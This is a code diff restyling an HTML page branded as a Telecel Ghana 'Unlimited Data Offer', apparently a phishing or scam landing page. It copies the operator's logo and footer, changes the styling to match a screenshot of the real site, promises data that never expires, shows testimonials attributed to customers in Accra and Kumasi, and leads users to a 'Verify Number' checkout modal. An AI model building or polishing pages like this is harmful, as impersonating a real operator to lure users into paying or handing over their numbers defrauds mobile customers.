@@ -9,13 +9,12 @@
     <style>
         :root {
             --red: #E30613;
-            --dark: #0a0a0a;
             --accent: #22c55e;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(to bottom, #fff0f0, #ffffff);
+            background: #f8f9fa;
             color: #1e2937;
             line-height: 1.6;
         }
@@ -38,41 +37,44 @@
         .logo {
             display: flex;
             align-items: center;
-            gap: 16px;
+            gap: 14px;
         }
-        .telecel-logo { width: 128px; height: 128px; }
+        .telecel-logo { width: 118px; height: 118px; }
         .telecel-play {
             color: white;
-            font-size: 2.1rem;
+            font-size: 2rem;
             font-weight: 800;
         }
         .telecel-play span { color: #60a5fa; }
 
-        /* HERO */
+        /* HERO - Screenshot Style */
         .hero {
             background: linear-gradient(135deg, #E30613, #9F1239);
             color: white;
-            padding: 110px 5% 90px;
+            padding: 100px 5% 80px;
             text-align: center;
             position: relative;
         }
         .hero h1 {
-            font-size: 3.7rem;
-            margin-bottom: 18px;
+            font-size: 3.5rem;
+            margin-bottom: 16px;
+        }
+        .hero p {
+            font-size: 1.3rem;
+            max-width: 700px;
+            margin: 0 auto 35px;
         }
 
-        /* PLANS */
+        /* PLANS - Light Theme */
         .plans-section {
-            background: var(--dark);
-            color: white;
             padding: 90px 5%;
         }
         .section-title {
             text-align: center;
-            font-size: 2.8rem;
+            font-size: 2.7rem;
             font-weight: 800;
             margin-bottom: 55px;
-            color: white;
+            color: #1e2937;
         }
         .tier-grid {
             display: grid;
@@ -82,16 +84,17 @@
             margin: 0 auto;
         }
         .tier-card {
-            background: #111111;
+            background: white;
             border-radius: 20px;
-            padding: 30px 22px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            padding: 28px 22px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border: 1px solid #eee;
         }
         .tier-card h3 {
             text-align: center;
             font-size: 1.5rem;
             margin-bottom: 22px;
-            color: #f1f5f9;
+            color: var(--red);
         }
         .offer {
             display: flex;
@@ -99,11 +102,11 @@
             align-items: center;
             padding: 14px 16px;
             margin: 9px 0;
-            background: #1a1a1a;
+            background: #f8f9fa;
             border-radius: 12px;
         }
-        .offer strong { font-size: 1.28rem; color: var(--accent); }
-        .price-tag { font-size: 1.4rem; font-weight: 700; color: #E30613; }
+        .offer strong { font-size: 1.25rem; color: #1e2937; }
+        .price-tag { font-size: 1.4rem; font-weight: 700; color: var(--red); }
 
         .get-offer-btn {
             background: var(--red);
@@ -112,16 +115,13 @@
             padding: 10px 22px;
             border-radius: 50px;
             font-weight: 600;
-            font-size: 0.98rem;
             cursor: pointer;
-            white-space: nowrap;
         }
 
-        /* Testimonials */
-        .testimonials {
-            background: var(--dark);
-            color: white;
-            padding: 90px 5%;
+        /* Testimonials & FAQ - Light */
+        .testimonials, .faq {
+            padding: 80px 5%;
+            background: white;
         }
         .testimonial-grid {
             display: grid;
@@ -129,89 +129,81 @@
             gap: 22px;
         }
         .testimonial-card {
-            background: #1a1a1a;
+            background: #f8f9fa;
             padding: 28px;
             border-radius: 18px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
         }
 
-        /* FAQ - Dark Theme */
-        .faq {
-            background: var(--dark);
-            color: white;
-            padding: 90px 5%;
-        }
         .faq-item {
-            background: #1a1a1a;
-            margin-bottom: 16px;
+            background: white;
+            margin-bottom: 14px;
             border-radius: 16px;
             overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
         }
         .faq-question {
-            padding: 22px;
+            padding: 20px;
             font-weight: 600;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            background: #f8f9fa;
         }
         .faq-answer {
-            padding: 0 22px 22px;
+            padding: 0 20px 20px;
             display: none;
-            color: #ccc;
+            color: #555;
         }
 
-        /* FOOTER */
+        /* FOOTER - Kept Black */
         footer {
             background: #111111;
             color: #ccc;
-            padding: 80px 5% 40px;
+            padding: 70px 5% 40px;
         }
         .footer-grid {
-            max-width: 1300px;
+            max-width: 1200px;
             margin: 0 auto;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
             gap: 40px;
-        }
-        .footer-grid h4 {
-            color: white;
-            margin-bottom: 16px;
-        }
-        .footer-grid a {
-            color: #ccc;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 8px;
+            text-align: center;
         }
 
-        /* MODAL - Dark Telecel Theme */
+        /* MODAL - Matching Screenshot Style */
         #offerModal {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.92);
+            background: rgba(0,0,0,0.85);
             z-index: 2000;
             align-items: center;
             justify-content: center;
         }
         .modal-content {
-            background: #1a1a1a;
-            color: white;
+            background: white;
+            color: #1e2937;
             max-width: 460px;
             width: 92%;
-            border-radius: 24px;
+            border-radius: 20px;
             padding: 40px 35px;
             text-align: center;
-            box-shadow: 0 25px 60px rgba(227,6,19,0.5);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
         }
-        .modal-content h2 {
-            color: var(--red);
-            margin-bottom: 8px;
-        }
-        .modal-content strong {
-            color: var(--accent);
-            font-size: 2.6rem;
+        .modal-logo {
+            width: 80px;
+            height: 80px;
+            background: var(--red);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2.5rem;
+            font-weight: bold;
         }
     </style>
 </head>
@@ -224,7 +216,6 @@
                 <div class="cursor-pointer telecel-logo">
                     <svg width="135" height="135" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="white"></path>
-                        <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.045 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="#E30613"></path>
                     </svg>
                 </div>
                 <div class="telecel-play">Telecel <span>Play</span></div>
@@ -235,7 +226,7 @@
     <!-- HERO -->
     <section class="hero">
         <h1>Telecel Unlimited Data Offer</h1>
-        <p style="font-size:1.35rem; margin:20px 0 35px;">Data Never Expires • Instant Activation • Only for Telecel Users</p>
+        <p>Data Never Expires • Instant Activation • Only for Telecel Users</p>
         <button onclick="document.getElementById('plans').scrollIntoView({ behavior: 'smooth' })" 
                 style="background:white;color:var(--red);padding:18px 60px;border-radius:50px;font-weight:700;font-size:1.25rem;border:none;cursor:pointer;">
             Unlock All Plans Now →
@@ -299,7 +290,7 @@
 
     <!-- TESTIMONIALS -->
     <section class="section testimonials">
-        <h2 class="section-title">What Our Customers Say</h2>
+        <h2 class="section-title">What People Say</h2>
         <div class="testimonial-grid">
             <div class="testimonial-card"><strong>“Best data bundles in Ghana! Data never expires.”</strong><br><br>— Ama Mensah, Accra</div>
             <div class="testimonial-card"><strong>“I bought the Gold plan and still have data after 3 weeks. Amazing!”</strong><br><br>— Kofi Boateng, Kumasi</div>
@@ -308,7 +299,7 @@
         </div>
     </section>
 
-    <!-- FAQ - Dark Theme -->
+    <!-- FAQ -->
     <section class="section faq">
         <h2 class="section-title">Frequently Asked Questions</h2>
         <div style="max-width:900px; margin:0 auto;">
@@ -335,52 +326,31 @@
     <footer>
         <div class="footer-grid">
             <div>
-                <div style="margin-bottom:20px;">
-                    <strong style="color:white; font-size:1.8rem;">telecel</strong>
+                <div class="logo" style="justify-content:center;">
+                    <svg width="70" height="70" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="48" cy="48" r="46" fill="white"/>
+                        <text x="48" y="53" font-family="Arial Black, sans-serif" font-size="54" font-weight="900" fill="#E30613" text-anchor="middle" dominant-baseline="middle">T</text>
+                    </svg>
                 </div>
             </div>
-            <div>
-                <h4>TELECEL GHANA</h4>
-                <a href="#">Personal</a>
-                <a href="#">Business</a>
-                <a href="#">About Us</a>
-                <a href="#">Vacancies</a>
-            </div>
-            <div>
-                <h4>HELP & SUPPORT</h4>
-                <a href="#">Find a shop</a>
-                <a href="#">Contact us</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Cookie Policy</a>
-            </div>
-            <div>
-                <h4>POPULAR</h4>
-                <a href="#">Mobile Bundles</a>
-                <a href="#">Apply for Broadband</a>
-                <a href="#">Your Business Online</a>
-                <a href="#">2 Moorch Business</a>
-            </div>
-            <div>
-                <h4>QUICKLINKS</h4>
-                <a href="#">Telecel Play</a>
-                <a href="#">Pay Bill</a>
-                <a href="#">Student Onboarding</a>
-                <a href="#">Wholesale Self-care</a>
-                <a href="#">Agent Portal</a>
-            </div>
+            <div><h4 style="color:white;">Telecel Ghana</h4><p>Connecting Ghana Better</p></div>
+            <div><h4 style="color:white;">Support</h4><p>100</p><p>support@telecel.com.gh</p></div>
+            <div><h4 style="color:white;">Quick Links</h4><p>Coverage • Terms • Privacy</p></div>
         </div>
-        <p style="text-align:center;margin-top:70px;opacity:0.6;">© 2026 Telecel Ghana. All Rights Reserved.</p>
+        <p style="text-align:center;margin-top:60px;opacity:0.6;">© 2026 Telecel Ghana. All Rights Reserved.</p>
     </footer>
 
-    <!-- MODAL -->
+    <!-- MODAL - Screenshot Style -->
     <div id="offerModal">
         <div class="modal-content">
-            <h2 id="modalTitle" style="color:var(--red);"></h2>
-            <div id="modalBody" style="margin:25px 0; font-size:1.3rem; line-height:1.6;"></div>
-            <button onclick="proceedToCheckout()" style="width:100%; padding:17px; background:var(--red); color:white; border:none; border-radius:50px; font-size:1.15rem; font-weight:700; margin-bottom:12px;">
-                Verify My Number & Activate Now
+            <div class="modal-logo">t</div>
+            <h2 id="modalTitle" style="color:var(--red); font-size:1.6rem; margin-bottom:8px;"></h2>
+            <p style="color:#666; margin-bottom:20px;">Complete verification to activate your bundle</p>
+            <div id="modalBody" style="margin:20px 0; padding:15px; background:#fef2f2; border-radius:12px;"></div>
+            <button onclick="proceedToCheckout()" style="width:100%; padding:16px; background:var(--red); color:white; border:none; border-radius:50px; font-size:1.1rem; font-weight:700;">
+                Verify Number
             </button>
-            <button onclick="closeModal()" style="background:none; border:none; color:#aaa; font-size:1.05rem; cursor:pointer;">
+            <button onclick="closeModal()" style="margin-top:15px; background:none; border:none; color:#666; font-size:1.05rem; cursor:pointer;">
                 Cancel
             </button>
         </div>
@@ -393,10 +363,10 @@
             currentOffer = {tier, data, price};
             document.getElementById('modalTitle').innerHTML = `${tier} - ${data}`;
             document.getElementById('modalBody').innerHTML = `
-                <strong style="font-size:2.7rem; color:var(--accent);">GHS ${price}</strong><br><br>
-                <span style="color:var(--accent); font-size:1.2rem;">✅ Data Never Expires</span><br>
-                <span style="color:var(--accent); font-size:1.2rem;">✅ Instant Activation</span><br><br>
-                <strong style="font-size:1.1rem;">We will verify your Telecel number before unlocking this offer.</strong>
+                <strong style="font-size:2.4rem; color:var(--red);">GHS ${price}</strong><br><br>
+                <span style="color:var(--accent)">✅ Data Never Expires</span><br>
+                <span style="color:var(--accent)">✅ Instant Activation</span><br><br>
+                <strong style="font-size:1.05rem;">We will verify your Telecel number before unlocking this offer.</strong>
             `;
             document.getElementById('offerModal').style.display = 'flex';
         }
